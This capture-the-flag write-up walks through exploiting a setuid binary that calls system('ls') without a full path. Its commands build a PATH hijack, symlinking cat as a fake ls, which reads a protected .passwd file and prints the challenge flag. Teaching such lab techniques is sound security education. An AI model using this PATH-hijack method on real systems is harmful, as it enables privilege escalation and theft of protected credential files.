## ðŸ”Ž Solution
Upon connecting to the target machine, we are presented with a list of files in the current directory:
```js
app-script-ch11@challenge02:~$ ls -la
total 36
dr-xr-x---  2 app-script-ch11-cracked app-script-ch11 4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root            4096 Sep  5  2023 ..
//highlight-start
-r-sr-x---  1 app-script-ch11-cracked app-script-ch11 7252 Dec 10  2021 ch11
-r--r-----  1 app-script-ch11-cracked app-script-ch11  187 Dec 10  2021 ch11.c
//highlight-end
-rw-r-----  1 root                    root              43 Dec 10  2021 .git
-r--r-----  1 app-script-ch11-cracked app-script-ch11  494 Dec 10  2021 Makefile
//highlight-next-line
-r--------  1 app-script-ch11-cracked app-script-ch11   14 Dec 10  2021 .passwd
-r--------  1 root                    root             775 Dec 10  2021 ._perms
```
Our goal is to read the contents of the `.passwd` file in order to retrieve the flag. 
However, direct access is restricted:
```
app-script-ch11@challenge02:~$ cat .passwd 
cat: .passwd: Permission denied
```

Looking into the source code, we observe that when the binary `ch11` is executed, it internally runs the command `ls /challenge/app-script/ch11/.passwd`. 
```c
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

Since we have execute permission on ch11, we can use this behavior to our advantage:
```
app-script-ch11@challenge02:~$ ./ch11 
/challenge/app-script/ch11/.passwd
```

There are multiple possible approaches from here, but we'll go with **a symbolic link** (symlink) attack by exploiting how the system("`ls ...`") call works.

Key observations:
- The `system()` function does not invoke `/bin/ls` directly.
- Instead, it spawns a shell (`/bin/sh`) which resolves ls using the **PATH** environment variable.
- If we override the **PATH** variable to point to *a fake ls* (which is actually a symlink to *cat*), we can trick the program into executing *cat* instead of *ls*.

Here's how to do it:
1. Create a fake directory:
```
mkdir /tmp/fake
```
2. Create a symbolic link from `ls` to `cat`:
```
ln -s /bin/cat /tmp/fake/ls
```
3. Run the vulnerable binary with the modified PATH:
```
app-script-ch11@challenge02:~$ PATH=/tmp/fake:$PATH ./ch11
!oPe96a/.s8d5
```
And just like that, the contents of `.passwd` are revealed, giving us the flag.
